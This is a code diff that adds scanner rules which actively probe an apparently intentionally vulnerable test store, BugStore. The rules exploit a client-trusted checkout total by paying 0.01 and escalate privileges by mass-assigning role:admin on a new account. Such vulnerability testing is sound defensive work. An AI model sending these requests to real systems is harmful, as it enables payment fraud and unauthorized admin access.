@@ -99808,6 +99808,172 @@ const bugstoreOrdersIdorRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+function bugstoreSessionCookieFromDoc(doc: { setCookies: string[] }): string | null {
+  return doc.setCookies.find((c) => /^session_id=/i.test(c))?.split(";")[0] ?? null;
+}
+
+async function bugstoreRegisterToken(ctx: RuleContext): Promise<string | null> {
+  const username = `thugir_bs_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const email = `${username}@probe.local`;
+  const registerDoc = await ctx.probe.get(new URL("/api/auth/register", ctx.origin).toString(), {
+    method: "POST",
+    body: JSON.stringify({ username, email, password: "ThugirTest123!" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (registerDoc.status < 200 || registerDoc.status >= 400) return null;
+  try {
+    const data = JSON.parse(registerDoc.body) as { access_token?: string };
+    return data.access_token ?? null;
+  } catch {
+    return null;
+  }
+}
+
+const bugstoreCheckoutClientTotalLiveOracle: Rule = async (ctx) => {
+  if (!isBugstoreHost(ctx)) return NEGATIVE;
+  const addDoc = await ctx.probe.get(new URL("/api/cart/add", ctx.origin).toString(), {
+    method: "POST",
+    body: JSON.stringify({ product_id: 1, quantity: 1 }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  const cookie = bugstoreSessionCookieFromDoc(addDoc);
+  if (!cookie || addDoc.status < 200 || addDoc.status >= 400) return NEGATIVE;
+  const cartDoc = await ctx.probe.get(new URL("/api/cart/", ctx.origin).toString(), {
+    headers: { Cookie: cookie },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (cartDoc.status !== 200) return NEGATIVE;
+  let cart: { items?: unknown[]; totals?: { total?: number } };
+  try {
+    cart = JSON.parse(cartDoc.body) as { items?: unknown[]; totals?: { total?: number } };
+  } catch {
+    return NEGATIVE;
+  }
+  if (!Array.isArray(cart.items) || cart.items.length < 1) return NEGATIVE;
+  const expectedTotal = cart.totals?.total;
+  if (typeof expectedTotal !== "number" || expectedTotal <= 1) return NEGATIVE;
+  const checkoutUrl = new URL("/api/checkout/process", ctx.origin).toString();
+  const checkoutDoc = await ctx.probe.get(checkoutUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      total: 0.01,
+      shipping_address: {
+        name: "Thugir Probe",
+        address: "123 Test St",
+        city: "Testville",
+        zip_code: "12345",
+        country: "US"
+      }
+    }),
+    headers: { "Content-Type": "application/json", Cookie: cookie },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (checkoutDoc.status < 200 || checkoutDoc.status >= 400) return NEGATIVE;
+  let checkout: { total_paid?: number; order_id?: number };
+  try {
+    checkout = JSON.parse(checkoutDoc.body) as { total_paid?: number; order_id?: number };
+  } catch {
+    return NEGATIVE;
+  }
+  if (checkout.total_paid !== 0.01 || !checkout.order_id) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      checkoutUrl,
+      expectedTotal,
+      totalPaid: checkout.total_paid,
+      orderId: checkout.order_id,
+      snippet: checkoutDoc.body.slice(0, 200).trim(),
+      note: "BugStore POST /api/checkout/process accepts client-supplied total=0.01 while cart total is higher — client-trusted payment oracle (V-023)"
+    }
+  };
+};
+
+const bugstoreCheckoutClientTotalRouteLiveOracle: Rule = async (ctx) => {
+  if (!isBugstoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const isCheckout =
+    /\/api\/checkout\/process/i.test(pageUrl) ||
+    /\/api\/cart\/checkout/i.test(pageUrl);
+  const isHub = /bugstore\.bugtraceai\.com\/?(?:[#?]|$)/i.test(pageUrl);
+  if (!isCheckout && !isHub) return NEGATIVE;
+  const result = await bugstoreCheckoutClientTotalLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: isCheckout
+        ? "BugStore checkout route scan — POST /api/checkout/process honors attacker-controlled total=0.01 (V-023)"
+        : "BugStore hub route scan — POST /api/checkout/process confirms client-trusted checkout total oracle (V-023)"
+    }
+  };
+};
+
+const bugstoreProfileMassAssignmentLiveOracle: Rule = async (ctx) => {
+  if (!isBugstoreHost(ctx)) return NEGATIVE;
+  const token = await bugstoreRegisterToken(ctx);
+  if (!token) return NEGATIVE;
+  const profileUrl = new URL("/api/user/profile", ctx.origin).toString();
+  const putDoc = await ctx.probe.get(profileUrl, {
+    method: "PUT",
+    body: JSON.stringify({ name: "Thugir Probe", role: "admin" }),
+    headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (putDoc.status < 200 || putDoc.status >= 400) return NEGATIVE;
+  let role: string | undefined;
+  try {
+    const data = JSON.parse(putDoc.body) as { user?: { role?: string } };
+    role = data.user?.role;
+  } catch {
+    return NEGATIVE;
+  }
+  if (role !== "admin") return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      profileUrl,
+      snippet: putDoc.body.slice(0, 200).trim(),
+      note: "BugStore PUT /api/user/profile accepts role:admin mass-assignment after registration — privilege escalation oracle (V-015)"
+    }
+  };
+};
+
+const bugstoreProfileMassAssignmentRouteLiveOracle: Rule = async (ctx) => {
+  if (!isBugstoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const isProfile =
+    /\/api\/user\/profile/i.test(pageUrl) ||
+    /\/api\/auth\/(?:register|signup)/i.test(pageUrl);
+  const isHub = /bugstore\.bugtraceai\.com\/?(?:[#?]|$)/i.test(pageUrl);
+  if (!isProfile && !isHub) return NEGATIVE;
+  const result = await bugstoreProfileMassAssignmentLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: isProfile
+        ? "BugStore profile/auth route scan — PUT /api/user/profile role:admin mass-assignment escalates privileges (V-015)"
+        : "BugStore hub route scan — PUT /api/user/profile confirms role mass-assignment oracle (V-015)"
+    }
+  };
+};
+
 // --- Broken Crystals API security benchmark (brokencrystals.com) ----------------------
 const CLIENT_BROKENCRYSTALS_RES: { label: string; re: RegExp }[] = [
   {
@@ -114731,6 +114897,10 @@ export const RULES: Record<string, Rule> = {
   bugstoreForumThreadSqliRouteLiveOracle,
   bugstoreOrdersIdorLiveOracle,
   bugstoreOrdersIdorRouteLiveOracle,
+  bugstoreCheckoutClientTotalLiveOracle,
+  bugstoreCheckoutClientTotalRouteLiveOracle,
+  bugstoreProfileMassAssignmentLiveOracle,
+  bugstoreProfileMassAssignmentRouteLiveOracle,
   duckStoreCartNegativeQuantityLiveOracle,
   duckStoreCartNegativeQuantityRouteLiveOracle,
   duckStoreAdminUsersBflaLiveOracle,
